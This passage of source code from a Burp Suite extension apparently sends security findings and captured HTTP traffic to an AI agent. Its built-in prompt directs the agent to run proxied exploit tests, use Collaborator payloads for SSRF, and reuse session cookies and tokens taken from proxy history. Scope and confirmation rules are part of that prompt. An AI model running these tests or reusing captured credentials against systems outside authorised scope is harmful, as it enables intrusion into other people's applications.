                "- 'API/curl only' = agent uses curl through Burp proxy (default, fast)\n"
                "- 'Verify in browser' = agent ALSO uses BrowserOS MCP to reproduce in a real browser\n"
                "  (traffic still routed through Burp; agent will ask you before destructive actions)"
            ) % n_items
            choice = JOptionPane.showOptionDialog(
                None, msg, "Send to Agent",
                JOptionPane.DEFAULT_OPTION, JOptionPane.QUESTION_MESSAGE,
                None, options, options[0]
            )
            if choice == 0:
                return False
            if choice == 1:
                return True
            return None  # Cancel or closed
        except Exception as e:
            self.stderr.println("[AGENT] Browser verify dialog error: %s" % self._safe_ascii_text(e))
            return False

    def _sendFindingsToAgent(self):
        """Queue selected findings for agent AI to pick up via the local API."""
        try:
            # Debug: log selection state
            selected_view_rows = self.findingsTable.getSelectedRows()
            self.stdout.println("[DEBUG] Selected view rows: %s (count: %d)" % (list(selected_view_rows), len(selected_view_rows)))

            model_rows = self._getSelectedModelRows()
            self.stdout.println("[DEBUG] Converted model rows: %s (count: %d)" % (model_rows, len(model_rows)))

            if not model_rows:
                self.stderr.println("[AGENT] No findings selected")
                return

            with self.findings_lock_ui:
                finding_ids = []
                summaries = []
                request_data = None
                response_data = None
                url = None
                for model_row in model_rows:
                    if 0 <= model_row < len(self.findings_list):
                        finding_ids.append(model_row)
                        finding = self.findings_list[model_row]
                        summaries.append(finding.get("title", "")[:80])
                        # Capture request/response from first finding that has it
                        if request_data is None and finding.get("request_data"):
                            request_data = finding.get("request_data")
                            response_data = finding.get("response_data")
                            url = finding.get("url", "")

            if not finding_ids:
                self.stderr.println("[AGENT] No valid findings selected")
                return

            # Ask for optional context/question + browser verification toggle
            n = len(finding_ids)
            placeholder_text = (
                "e.g. 'Does this really have impact given the endpoint is admin-only?', "
                "'User session cookie is HttpOnly - is the XSS still exploitable?', "
                "'Please confirm exploitability end-to-end and rate real severity'..."
            )
            ctx_result = self._askAgentContext(
                title="Send Finding(s) to Agent - Add Context",
                info_text="%d finding(s) selected for agent review." % n,
                placeholder_text=placeholder_text,
            )
            if ctx_result is None:
                # User cancelled
                return
            user_context = ctx_result.get("context", "")
            browser_verify = bool(ctx_result.get("browser_verify", False))

            # Auto-start server if not running
            if self.agent_server is None:
                self.stdout.println("[AGENT] Server not running, starting now...")
                if not self.start_agent_server():
                    self.stderr.println("[AGENT] Failed to start server; cannot enqueue")
                    return

            with self.agent_queue_lock:
                qid = self.agent_queue_next_id
                self.agent_queue_next_id += 1
                summary = "; ".join(summaries[:3])
                if len(summaries) > 3:
                    summary += " (+%d more)" % (len(summaries) - 3)
                queue_item = {
                    "id": qid,
                    "status": "pending",
                    "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "claimed_at": None,
                    "completed_at": None,
                    "finding_ids": finding_ids,
                    "summary": summary,
                    "assessment": "",
                    "test_results": [],
                    "notes": [],
                    "user_context": user_context,
                    "source": "findings",
                    "browser_verify": browser_verify,
                    # Include HTTP data from the finding for agent testing
                    "url": url,
                    "request_data": request_data,
                    "response_data": response_data
                }
                self.agent_queue.append(queue_item)
                self.selected_agent_queue_index = len(self.agent_queue) - 1

            self.save_agent_queue()
            self.log_to_console("[AGENT] Queued %d finding(s) as work item #%d" % (len(finding_ids), qid))
            self.log_to_console("[AGENT] Finding IDs: %s" % ", ".join(str(x + 1) for x in finding_ids))
            self.log_to_console("[AGENT] Agent can pick it up at: http://%s:%d/api/agent/queue/%d" % (
                self.agent_server_host, self.agent_server_port, qid))
            self._ui_dirty = True
            self.refreshUI()
            self._focus_agent_tab()

        except Exception as e:
            self.stderr.println("[AGENT] Error: %s" % self._safe_ascii_text(e))

    def _askAgentContext(self, title, info_text, placeholder_text, submit_label="Queue for Agent"):
        """Show a modal dialog collecting optional context + browser_verify toggle.

        Returns a dict {'context': str, 'browser_verify': bool} on submit, or None if
        the user cancelled / closed the dialog.
        """
        from javax.swing import JDialog, JTextArea, JButton, JLabel, JScrollPane, JCheckBox
        from java.awt import GridBagLayout, GridBagConstraints, Insets
        from java.awt.event import WindowAdapter

        is_dark_ui = False
        try:
            is_dark_ui = (self._detect_burp_theme() == "Dark")
        except:
            pass
        if not is_dark_ui:
            try:
                is_dark_ui = (self._resolved_theme() == "Dark")
            except:
                pass

        dialog = JDialog()
        dialog.setTitle(title)
        dialog.setModal(True)
        dialog.setSize(600, 380)
        dialog.setLocationRelativeTo(None)

        panel = JPanel(GridBagLayout())
        gbc = GridBagConstraints()
        gbc.insets = Insets(10, 10, 5, 10)
        gbc.fill = GridBagConstraints.HORIZONTAL
        gbc.anchor = GridBagConstraints.WEST

        # Info label
        gbc.gridx = 0
        gbc.gridy = 0
        gbc.gridwidth = 2
        gbc.weightx = 1.0
        infoLabel = JLabel(info_text)
        infoLabel.setFont(Font("Dialog", Font.BOLD, 12))
        panel.add(infoLabel, gbc)

        # Context label
        gbc.gridy = 1
        gbc.insets = Insets(10, 10, 2, 10)
        panel.add(JLabel("Context / question (optional) - anything the agent should know or answer:"), gbc)

        # Context text area
        gbc.gridy = 2
        gbc.weighty = 1.0
        gbc.fill = GridBagConstraints.BOTH
        gbc.insets = Insets(0, 10, 5, 10)

        contextArea = JTextArea(7, 40)
        contextArea.setLineWrap(True)
        contextArea.setWrapStyleWord(True)
        contextArea.setText(placeholder_text)
        if is_dark_ui:
            contextArea.setForeground(Color(0x86, 0xA8, 0x9A))
            try:
                contextArea.setCaretColor(Color(0x00, 0xF5, 0xA0))
            except:
                pass
        else:
            contextArea.setForeground(Color.GRAY)

        from java.awt.event import FocusListener
        class PlaceholderFocusListener(FocusListener):
            def __init__(self, area, placeholder, dark):
                self.area = area
                self.placeholder = placeholder
                self.dark = bool(dark)
                self.is_placeholder = True

            def focusGained(self, e):
                if self.is_placeholder:
                    self.area.setText("")
                    self.area.setForeground(Color.WHITE if self.dark else Color.BLACK)
                    self.is_placeholder = False

            def focusLost(self, e):
                if self.area.getText().strip() == "":
                    self.area.setText(self.placeholder)
                    self.area.setForeground(Color(0x86, 0xA8, 0x9A) if self.dark else Color.GRAY)
                    self.is_placeholder = True

        focus_listener = PlaceholderFocusListener(contextArea, placeholder_text, is_dark_ui)
        contextArea.addFocusListener(focus_listener)
        panel.add(JScrollPane(contextArea), gbc)

        # Browser verification checkbox
        gbc.gridy = 3
        gbc.weighty = 0.0
        gbc.fill = GridBagConstraints.HORIZONTAL
        gbc.insets = Insets(5, 10, 5, 10)
        browserVerifyCheck = JCheckBox("Verify findings via browser (agent will use BrowserOS MCP)")
        browserVerifyCheck.setToolTipText(
            "If checked, the agent is instructed to verify exploits in a real browser "
            "using BrowserOS MCP tools, with traffic routed through Burp proxy. "
            "Agent must ask you in chat before any state-changing actions."
        )
        panel.add(browserVerifyCheck, gbc)

        # Buttons
        gbc.gridy = 4
        gbc.weighty = 0.0
        gbc.fill = GridBagConstraints.HORIZONTAL
        gbc.insets = Insets(5, 10, 10, 10)
        buttonPanel = JPanel()

        result = [None]  # mutable container to pass result out of inner class

        def onQueue(e):
            try:
                e.getSource().setEnabled(False)
            except:
                pass
            context = contextArea.getText().strip()
            if focus_listener.is_placeholder:
                context = ""
            result[0] = {"context": context, "browser_verify": browserVerifyCheck.isSelected()}
            dialog.dispose()

        def onCancel(e):
            result[0] = None
            dialog.dispose()

        class DialogWindowListener(WindowAdapter):
            def windowClosing(self, e):
                result[0] = None

        dialog.addWindowListener(DialogWindowListener())

        queueBtn = JButton(submit_label)
        queueBtn.addActionListener(onQueue)
        buttonPanel.add(queueBtn)

        cancelBtn = JButton("Cancel")
        cancelBtn.addActionListener(onCancel)
        buttonPanel.add(cancelBtn)

        panel.add(buttonPanel, gbc)

        dialog.add(panel)
        self._apply_dark_theme_to_container(dialog)
        dialog.setVisible(True)

        # Dialog is modal - execution continues here after it closes
        return result[0]

    def _activeScanContextDialog(self, messages):
        """Show a context dialog before queuing requests for agent active scan."""
        n = len(messages)
        placeholder_text = (
            "e.g. 'Test for IDOR on the user ID parameter', "
            "'Auth token is in the Authorization header', "
            "'This endpoint changes account email - check for CSRF and auth bypass'..."
        )
        result = self._askAgentContext(
            title="Active Scan with Agent - Add Context",
            info_text="%d request(s) selected for agent active scan." % n,
            placeholder_text=placeholder_text,
        )
        if result is not None:
            self._sendRequestsToAgent(
                messages,
                user_context=result.get("context", ""),
                browser_verify=result.get("browser_verify", False),
            )

    def _analyzeFlowContextDialog(self, messages):
        """Show a context dialog before queuing requests for flow analysis."""
        n = len(messages)
        placeholder_text = (
            "e.g. 'This is a checkout flow: select product -> add to cart -> checkout -> payment', "
            "'User registration flow with email verification step', "
            "'Password reset flow that sends email with reset token', "
            "'Multi-step form submission for loan application'..."
        )
        result = self._askAgentContext(
            title="Analyze Flow - Add Context",
            info_text="%d requests selected for flow analysis. Describe what this flow does:" % n,
            placeholder_text=placeholder_text,
            submit_label="Analyze Flow",
        )
        if result is not None:
            self._sendFlowToAgent(
                messages,
                user_context=result.get("context", ""),
                browser_verify=result.get("browser_verify", False),
            )

    def _sendRequestsToAgent(self, messages, user_context="", browser_verify=False):
        """Queue raw HTTP request/response pairs for agent AI to analyze.

        This is the 'Active Scan' mode - it sends the original request/response data (from Proxy History,
        Repeater, etc.) to the agent's queue so the agent can perform manual testing with full context.
        """
        try:
            if not messages or len(messages) == 0:
                self.stderr.println("[AGENT] No requests selected")
                return

            # Auto-start server if not running
            if self.agent_server is None:
                self.stdout.println("[AGENT] Server not running, starting now...")
                if not self.start_agent_server():
                    self.stderr.println("[AGENT] Failed to start server; cannot enqueue")
                    return

            queued_count = 0
            with self.agent_queue_lock:
                for message in messages:
                    try:
                        req_info = self.helpers.analyzeRequest(message)
                        url = str(req_info.getUrl())
                        method = str(req_info.getMethod())

                        # Get request bytes
                        request_bytes = message.getRequest()
                        request_data = None
                        if request_bytes:
                            request_data = self._bytes_to_str(request_bytes)
                            # Truncate to 10KB to prevent memory bloat in queue
                            if request_data and len(request_data) > 10240:
                                request_data = request_data[:10240] + "... [truncated]"

                        # Get response bytes if available
                        response_data = None
                        status_code = None
                        response_bytes = message.getResponse()
                        if response_bytes:
                            response_info = self.helpers.analyzeResponse(response_bytes)
                            status_code = response_info.getStatusCode()
                            response_data = self._bytes_to_str(response_bytes)
                            # Truncate to 10KB to prevent memory bloat in queue
                            if response_data and len(response_data) > 10240:
                                response_data = response_data[:10240] + "... [truncated]"

                        # Get HTTP service for host/port/protocol
                        http_service = message.getHttpService()
                        host = str(http_service.getHost()) if http_service else ""
                        port = int(http_service.getPort()) if http_service else 0
                        protocol = str(http_service.getProtocol()) if http_service else "https"

                        qid = self.agent_queue_next_id
                        self.agent_queue_next_id += 1

                        queue_item = {
                            "id": qid,
                            "status": "pending",
                            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "claimed_at": None,
                            "completed_at": None,
                            "summary": "%s %s" % (method, url[:80]),
                            "assessment": "",
                            "test_results": [],
                            "notes": [],
                            # Store raw request/response data for Agent testing
                            "request_data": request_data,
                            "response_data": response_data,
                            "method": method,
                            "url": url,
                            "host": host,
                            "port": port,
                            "protocol": protocol,
                            "status_code": status_code,
                            "finding_ids": [],  # No pre-existing findings for this item
                            "source": "active_scan",
                            "user_context": user_context,
                            "browser_verify": bool(browser_verify)
                        }
                        self.agent_queue.append(queue_item)
                        queued_count += 1

                    except Exception as e:
                        self.stderr.println("[AGENT] Error queuing request: %s" % self._safe_ascii_text(e))
                        continue

                if queued_count > 0:
                    self.selected_agent_queue_index = len(self.agent_queue) - 1

            if queued_count > 0:
                self.save_agent_queue()
                self.log_to_console("[AGENT] Queued %d request(s) for agent manual testing" % queued_count)
                self._ui_dirty = True
                self.refreshUI()
                self._focus_agent_tab()
            else:
                self.stderr.println("[AGENT] No requests were queued")

        except Exception as e:
            self.stderr.println("[AGENT] Error in _sendRequestsToAgent: %s" % self._safe_ascii_text(e))

    def _sendFlowToAgent(self, messages, user_context="", browser_verify=False):
        """Queue multiple requests as a single flow for AI analysis.

        This is the 'Flow Analysis' mode - it sends the entire sequence of requests/responses
        as a single work item so the agent can analyze the flow logic, state transitions,
        and find bugs that span multiple requests (e.g., race conditions, workflow bypasses).
        Findings from flow analysis are prefixed with 'FLOW - '.
        """
        try:
            if not messages or len(messages) == 0:
                self.stderr.println("[AGENT] No requests selected for flow analysis")
                return

            # Auto-start server if not running
            if self.agent_server is None:
                self.stdout.println("[AGENT] Server not running, starting now...")
                if not self.start_agent_server():
                    self.stderr.println("[AGENT] Failed to start server; cannot enqueue")
                    return

            # Build flow data - all requests/responses in sequence
            flow_requests = []
            urls = []
            hosts = set()

            for idx, message in enumerate(messages):
                try:
                    req_info = self.helpers.analyzeRequest(message)
                    url = str(req_info.getUrl())
                    method = str(req_info.getMethod())
                    urls.append("%d. %s %s" % (idx + 1, method, url[:80]))

                    # Get request bytes
                    request_bytes = message.getRequest()
                    request_data = None
                    if request_bytes:
                        request_data = self._bytes_to_str(request_bytes)
                        # Truncate to 10KB per request to prevent memory bloat
                        if request_data and len(request_data) > 10240:
                            request_data = request_data[:10240] + "... [truncated]"

                    # Get response bytes if available
                    response_data = None
                    status_code = None
                    response_bytes = message.getResponse()
                    if response_bytes:
                        response_info = self.helpers.analyzeResponse(response_bytes)
                        status_code = response_info.getStatusCode()
                        response_data = self._bytes_to_str(response_bytes)
                        # Truncate to 10KB per response
                        if response_data and len(response_data) > 10240:
                            response_data = response_data[:10240] + "... [truncated]"

                    # Get HTTP service
                    http_service = message.getHttpService()
                    host = str(http_service.getHost()) if http_service else ""
                    port = int(http_service.getPort()) if http_service else 0
                    protocol = str(http_service.getProtocol()) if http_service else "https"
                    if host:
                        hosts.add(host)

                    flow_requests.append({
                        "step": idx + 1,
                        "method": method,
                        "url": url,
                        "host": host,
                        "port": port,
                        "protocol": protocol,
                        "status_code": status_code,
                        "request_data": request_data,
                        "response_data": response_data
                    })

                except Exception as e:
                    self.stderr.println("[AGENT] Error processing flow request %d: %s" % (idx + 1, self._safe_ascii_text(e)))
                    continue

            if not flow_requests:
                self.stderr.println("[AGENT] No valid requests to queue for flow analysis")
                return

            # Create single queue item for the entire flow
            with self.agent_queue_lock:
                qid = self.agent_queue_next_id
                self.agent_queue_next_id += 1

                primary_host = list(hosts)[0] if hosts else ""
                summary = "FLOW analysis: %d steps on %s" % (len(flow_requests), primary_host)

                queue_item = {
                    "id": qid,
                    "status": "pending",
                    "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "claimed_at": None,
                    "completed_at": None,
                    "summary": summary,
                    "assessment": "",
                    "test_results": [],
                    "notes": [],
                    "user_context": user_context,
                    "source": "flow_analysis",
                    "browser_verify": bool(browser_verify),
                    # Flow-specific data
                    "flow_requests": flow_requests,
                    "flow_steps": len(flow_requests),
                    "flow_hosts": list(hosts),
                    "flow_urls_summary": urls[:5]  # First 5 URLs for display
                }
                self.agent_queue.append(queue_item)
                self.selected_agent_queue_index = len(self.agent_queue) - 1

            self.save_agent_queue()
            self.log_to_console("[AGENT] Queued flow analysis (#%d): %d steps" % (qid, len(flow_requests)))
            self.log_to_console("[AGENT] Agent can pick it up at: http://%s:%d/api/agent/queue/%d" % (
                self.agent_server_host, self.agent_server_port, qid))
            self._ui_dirty = True
            self.refreshUI()
            self._focus_agent_tab()

        except Exception as e:
            self.stderr.println("[AGENT] Error in _sendFlowToAgent: %s" % self._safe_ascii_text(e))

    def start_agent_server(self):
        """Start the local HTTP API server for agent AI."""
        try:
            if self.agent_server is not None:
                self.log_to_console("[AGENT] Server already running on %s:%d" % (
                    self.agent_server_host, self.agent_server_port))
                return True

            # Generate token if not set
            if not self.agent_server_token:
                self.agent_server_token = uuid.uuid4().hex

            # Create handler factory that captures extender reference
            def handler_factory(*args, **kwargs):
                return AgentAPIHandler(self, *args, **kwargs)

            server = HTTPServer((self.agent_server_host, int(self.agent_server_port)), handler_factory)
            # Run server in background thread
            server_thread = threading.Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            self.agent_server = server
            self.agent_server_thread = server_thread

            self.stdout.println("")
            self.stdout.println("[AGENT API] " + "=" * 60)
            self.stdout.println("[AGENT API] Server started on http://%s:%d" % (
                self.agent_server_host, self.agent_server_port))
            self.stdout.println("[AGENT API] Bearer token: %s" % self.agent_server_token)
            self.stdout.println("[AGENT API] " + "=" * 60)
            self.stdout.println("")
            self._ui_dirty = True
            return True
        except Exception as e:
            self.stderr.println("[AGENT API] Failed to start server: %s" % self._safe_ascii_text(e))
            self.agent_server = None
            return False

    def extensionUnloaded(self):
        """Called by Burp when the extension is unloaded; clean up the HTTP server
        and force a final persistence flush so nothing in memory is lost."""
        try:
            self.save_findings()
        except Exception as e:
            try:
                self.stderr.println("[PERSIST] final save_findings on unload failed: %s" % self._safe_ascii_text(e))
            except Exception:
                pass
        try:
            self.save_agent_queue()
        except Exception as e:
            try:
                self.stderr.println("[PERSIST] final save_agent_queue on unload failed: %s" % self._safe_ascii_text(e))
            except Exception:
                pass
        try:
            self.stop_agent_server()
        except:
            pass

    def stop_agent_server(self):
        """Stop the Agent API server."""
        try:
            if self.agent_server is None:
                return True
            self.agent_server.shutdown()
            self.agent_server.server_close()
            self.agent_server = None
            self.agent_server_thread = None
            self.stdout.println("[AGENT API] Server stopped")
            self._ui_dirty = True
            return True
        except Exception as e:
            self.stderr.println("[AGENT API] Stop error: %s" % self._safe_ascii_text(e))
            return False

    def _copy_agent_bootstrap_prompt(self, include_browseros, button):
        try:
            url = "http://%s:%d" % (self.agent_server_host, self.agent_server_port)
            token = self.agent_server_token or "(server not running - start it first)"
            if include_browseros:
                text = self._build_agent_bootstrap_prompt(url, token)
                log_msg = "[AGENT] Browser-capable bootstrap prompt copied to clipboard"
            else:
                text = self._build_agent_ssh_bootstrap_prompt(url, token)
                log_msg = "[AGENT] SSH bootstrap prompt copied to clipboard"
            from java.awt import Toolkit
            from java.awt.datatransfer import StringSelection
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(text), None)
            self.log_to_console(log_msg)
            original_text = button.getText()
            button.setText("Copied")
            from javax.swing import Timer
            def _restore_text(event):
                button.setText(original_text)
            t = Timer(2000, _restore_text)
            t.setRepeats(False)
            t.start()
        except Exception as ex:
            self.stderr.println("[AGENT] Copy error: %s" % self._safe_ascii_text(ex))

    def _build_agent_ssh_bootstrap_prompt(self, url, token):
        """Build a headless/SSH agent prompt without browser-specific instructions."""
        text = self._build_agent_bootstrap_prompt(url, token)
        text = text.replace(
            "5. AUTH 401/403: Call /api/agent/auth/latest?host=<host>&include_related=true and use recommended_auth.raw_header_lines, including Cookie headers from source_hosts. Empty Bearer alone does NOT mean the live browser session is expired. If no usable auth appears but BrowserOS has a live session, refresh the relevant BrowserOS page or perform one same-site action in the proxied browser, then call auth/latest again BEFORE asking the user for tokens. Never guess logins.\n",
            "5. AUTH 401/403: Call /api/agent/auth/latest?host=<host>&include_related=true and use recommended_auth.raw_header_lines, including Cookie headers from source_hosts. Empty Bearer alone does NOT mean the session is expired. If no usable auth appears, ask the user for tokens. Never guess logins.\n"
        )
        text = re.sub(
            r"\nSTEP 2 - Check BrowserOS app is installed .*?\nSTEP 5 - Read project context files:",
            "\nSTEP 2 - Read project context files:",
            text,
            flags=re.S
        )
        text = text.replace("STEP 6 - Pull and triage current findings:", "STEP 3 - Pull and triage current findings:")
        text = text.replace("STEP 7 - Run API preflight (no target traffic):", "STEP 4 - Run API preflight (no target traffic):")
        text = text.replace("STEP 8 - Report ready, then WAIT for user to send 'q' or queue work:", "STEP 5 - Report ready, then WAIT for user to send 'q' or queue work:")
        text = text.replace(
            "  Format: 'Ready. BrowserOS [running/curl-only], MCP [registered/n/a], scope loaded, N findings triaged. Send q to start.'\n",
            "  Format: 'Ready. SSH/curl-only mode, scope loaded, N findings triaged. Send q to start.'\n"
        )
        text = text.replace(
            "2. CHECK browser_verify field:\n"
            "   - TRUE: Use BrowserOS MCP ONLY (see BROWSER VERIFICATION below). No curl.\n"
            "   - FALSE: Call GET /api/agent/queue/<id>/curl?refresh_auth=true. Run the generated curl command exactly. Do not run target curl without the -x proxy flag; use /api/agent/request with comment/note only as fallback/convenience.\n",
            "2. If browser_verify=true, this SSH prompt is curl-only/headless; report that browser verification needs a desktop/browser-capable agent or manual user evidence. Otherwise call GET /api/agent/queue/<id>/curl?refresh_auth=true and run the generated curl command exactly. Do not run target curl without the -x proxy flag; use /api/agent/request with comment/note only as fallback/convenience.\n"
        )
        text = re.sub(
            r"\n=== BROWSER VERIFICATION \(browser_verify=TRUE\) ===\n.*?\n=== TESTING METHODOLOGY ===\n",
            "\n=== TESTING METHODOLOGY ===\n",
            text,
            flags=re.S
        )
        return text

    def _build_agent_bootstrap_prompt(self, url, token):
        """Build a complete self-contained prompt that teaches any agent session how to use the API."""
        # Pre-fetch collaborator payload if available
        collaborator_section = ""
        # Retry init if collaborator is None (in case it failed during startup)
        if self.collaborator is None:
            try:
                self.collaborator = self.callbacks.createBurpCollaboratorClient()
                self.stdout.println("[COLLABORATOR] Retried init (createBurpCollaboratorClient) - SUCCESS")
            except AttributeError:
                # Try alternative method
                try:
                    self.collaborator = self.callbacks.createBurpCollaboratorClientContext()
                    self.stdout.println("[COLLABORATOR] Retried init (createBurpCollaboratorClientContext) - SUCCESS")
                except Exception as _alt_ex:
                    self.stderr.println("[COLLABORATOR] Retry init failed (tried both methods): %s" % str(_alt_ex))
            except Exception as _retry_ex:
                self.stderr.println("[COLLABORATOR] Retry init failed: %s" % str(_retry_ex))

        if self.collaborator is not None:
            try:
                try:
                    payload = self.collaborator.generatePayload(True)
                except TypeError:
                    payload = self.collaborator.generatePayload()
                payload = str(payload)
                location = str(self.collaborator.getCollaboratorServerLocation())
                collaborator_section = (
                    "=== BURP COLLABORATOR (SSRF TESTING) ===\n"
                    "Collaborator payload (pre-generated from Burp):\n"
                    "  " + payload + "\n"
                    "  Collaborator server: " + location + "\n"
                    "Use this payload in your SSRF tests. If you need a fresh payload, call:\n"
                    "  curl -s " + url + "/api/agent/collaborator\n"
                    "After injecting a payload, poll for OOB proof:\n"
                    "  curl -s " + url + "/api/agent/collaborator/interactions?payload=" + payload + "\n"
                    "\n"
                )
            except Exception as _ex:
                collaborator_section = (
                    "=== BURP COLLABORATOR (SSRF TESTING) ===\n"
                    "Collaborator is available but payload generation failed: " + str(_ex) + "\n"
                    "You can still call the API endpoint to get a payload:\n"
                    "  curl -s " + url + "/api/agent/collaborator\n"
                    "After injecting a payload, poll /api/agent/collaborator/interactions?payload=<payload> for proof.\n"
                    "\n"
                )
        else:
            collaborator_section = (
                "=== BURP COLLABORATOR (SSRF TESTING) ===\n"
                "Collaborator init failed. Check Burp console for error details. For SSRF tests, ask the user for an alternative payload.\n"
                "\n"
            )

        # CONDENSED BOOTSTRAP PROMPT - Key info only, reference /api/docs for details
        return (
            "=== DOUBLE AGENT - API CONNECTION ===\n"
            "Base URL: " + url + "\n"
            "Bearer: " + token + "\n"
            "Auth: Authorization: Bearer " + token + " (not needed for /api/health, /api/docs)\n"
            "*** FORGET API DETAILS? CALL: curl -s " + url + "/api/docs ***\n"
            "\n" +
            collaborator_section +
            "=== QUICK REFERENCE ===\n"
            "Preflight:       GET " + url + "/api/agent/preflight?host=<target-host> before active testing\n"
            "Target curl:     GET " + url + "/api/agent/queue/<id>/curl?refresh_auth=true, then run generated curl exactly (-x http://127.0.0.1:8080 is REQUIRED)\n"
            "Auth refresh:    GET " + url + "/api/agent/auth/latest?host=<host>&limit=100&include_related=true\n"
            "History regex:   GET " + url + "/api/agent/history/http/regex?regex=<pattern>&count=50\n"
            "HTTP/2 request:  POST " + url + "/api/agent/request/http2  body={targetHostname,targetPort,usesHttps,pseudoHeaders,headers,requestBody}\n"
            "List findings:   GET " + url + "/api/findings\n"
            "Create finding:  POST " + url + "/api/findings  body={url,title,severity,confidence,agent_status,agent_priority,active_test_recipe}\n"
            "Triage (bulk):   POST " + url + "/api/findings/triage  body={\"updates\":[{id,status,priority,rationale}]}\n"
            "Queue:           GET " + url + "/api/agent/queue\n"
            "Claim work:      POST " + url + "/api/agent/queue/<id>/claim\n"
            "Get work item:   GET " + url + "/api/agent/queue/<id>\n"
            "Heartbeat:       POST " + url + "/api/agent/queue/<id>/heartbeat  (every ~5min on long tasks)\n"
            "Submit results:  POST " + url + "/api/agent/queue/<id>/result\n"
            "\n"
            "=== RULES (MANDATORY) ===\n"
            "1. READ scope.md, target.md, findings.md FIRST. Skip if already covered.\n"
            "2. TRIAGE before testing. Triage means a passive classification pass over existing finding data, not exploitation and not title-only sorting. Use /api/findings fields: URL, title, severity/confidence, detail_preview, evidence_preview, CWE/OWASP, has_request_data, has_response_data, and relationships to other findings.\n"
            "   Status meanings: valid=likely reportable and worth validating, including real low-risk issues when priority=P4; needs_investigation=plausible but evidence incomplete; false_positive=not a real security issue or contradicted by evidence; duplicate=same endpoint/parameter/root cause/evidence as another finding and will be deleted; already_covered=same endpoint+technique already tested/covered and will be deleted; not_important=false positive, zero-risk, or non-actionable noise and is hidden from normal findings/report views; untouched=not reviewed.\n"
            "   For every triage update, provide a concrete rationale tied to actual finding data. For duplicate deletion, include duplicate_of or duplicate_evidence_match plus matching endpoint/parameter/root cause/evidence. Mark FPs with status=false_positive,set_fp=true; defer Low+Tentative unless easy to confirm.\n"
            "3. MONITOR FINDINGS: While active in this session, poll /api/findings every 5 minutes and triage any new, untouched, or changed findings before continuing active testing. POST updates to /api/findings/triage so Burp stays current.\n"
            "4. TOKEN BUDGET: Low signal = minimal requests. One auth check + one probe then stop.\n"
            "5. AUTH 401/403: Call /api/agent/auth/latest?host=<host>&include_related=true and use recommended_auth.raw_header_lines, including Cookie headers from source_hosts. Empty Bearer alone does NOT mean the live browser session is expired. If no usable auth appears but BrowserOS has a live session, refresh the relevant BrowserOS page or perform one same-site action in the proxied browser, then call auth/latest again BEFORE asking the user for tokens. Never guess logins.\n"
            "   Use /api/agent/history/http/regex for endpoint discovery, auth/session recovery, parameter pattern search, and variant analysis before asking the user for more context.\n"
            "6. POST /api/findings/triage after triage so Burp shows Agent Status/Priority.\n"
            "7. MANDATORY CURL RULE: every curl request to a target application MUST include -x http://127.0.0.1:8080. Local Double Agent API calls to " + url + " are exempt. Before running any target curl, check the command and add the proxy flag if missing.\n"
            "8. For queue items, do not hand-build target curl first. Call /api/agent/queue/<id>/curl?refresh_auth=true and run the generated command exactly unless you have a specific reason to modify it.\n"
            "9. Respect generated scope_guard and safety_gate. If either requires confirmation, stop and ask the user before active testing. Never test hosts marked in_scope=false.\n"
            "10. When sending test requests through Burp Proxy, add header: X-Double-Agent-Note: Agent: <finding/work item> - <test purpose> - <expected result>. The extension copies this into the visible Proxy history comment and strips the header before upstream. If using /api/agent/request, include comment or note as the same text, but prefer the proxy header when the user needs to see notes in Proxy history.\n"
            "   For HTTP/2-only or HTTP/2-sensitive behavior, use /api/agent/request/http2 so the PortSwigger MCP send_http2_request tool preserves pseudo-headers and protocol semantics.\n"
            "   For blind/OOB tests, generate a Collaborator payload, inject it safely, then poll /api/agent/collaborator/interactions?payload=<payload> before reporting.\n"
            "11. ACTIVE HANDOFF: If a finding has active_test_recipe, follow its hypothesis, mutation_hint, expected signals, max_requests, needs_second_user, and safety_notes before inventing a new plan.\n"
            "12. NEW FINDINGS: If you discover vulns during testing, POST them to /api/findings with agent_status=valid, agent_priority=P1/P2, agent_rationale, and active_test_recipe.\n"
            "\n"
            "=== STARTUP SEQUENCE (RUN ONCE WHEN YOU RECEIVE THIS PROMPT — DO NOT SKIP) ===\n"
            "Execute these steps IN ORDER before doing anything else. Report results to user.\n"
            "\n"
            "STEP 1 - Verify Burp API is up:\n"
            "  curl -s " + url + "/api/health && curl -s " + url + "/api/docs\n"
            "\n"
            "STEP 2 - Check BrowserOS app is installed (do NOT use mdfind, do NOT search):\n"
            "  ls /Applications/BrowserOS.app >/dev/null 2>&1 && echo INSTALLED || echo NOT_INSTALLED\n"
            "  - INSTALLED -> proceed to STEP 3\n"
            "  - NOT_INSTALLED -> ASK user: 'BrowserOS not installed. Install via: brew install --cask browseros ?'\n"
            "      If yes: run that command, then proceed. If no: report 'curl-only mode' and SKIP steps 3-4.\n"
            "\n"
            "STEP 3 - Launch BrowserOS in Burp proxy mode:\n"
            "  pkill -f BrowserOS 2>/dev/null; sleep 1; open -na 'BrowserOS' --args --proxy-server=127.0.0.1:8080\n"
            "  sleep 4 && pgrep -if browseros >/dev/null && echo RUNNING || echo NOT_RUNNING\n"
            "  - RUNNING -> report 'BrowserOS launched in proxy mode.'\n"
            "  - NOT_RUNNING -> report 'BrowserOS failed to launch, falling back to curl-only mode.'\n"
            "\n"
            "STEP 4 - Register BrowserOS MCP (idempotent — only register if missing):\n"
            "  claude mcp list 2>/dev/null | grep -i browseros\n"
            "  - If ANY line with 'browseros' appears (even '✗ Failed to connect' is OK — server may still be binding) -> registered, skip.\n"
            "  - If NO line -> claude mcp add --transport http browseros http://127.0.0.1:9000/mcp --scope user\n"
            "  Note: '✗ Failed to connect' immediately after launch is normal; do NOT re-register.\n"
            "\n"
            "STEP 5 - Read project context files:\n"
            "  cat scope.md 2>/dev/null; cat target.md 2>/dev/null; cat findings.md 2>/dev/null\n"
            "  If scope.md is MISSING -> STOP and ask user for scope before any testing.\n"
            "\n"
            "STEP 6 - Pull and triage current findings:\n"
            "  curl -s -H 'Authorization: Bearer " + token + "' " + url + "/api/findings\n"
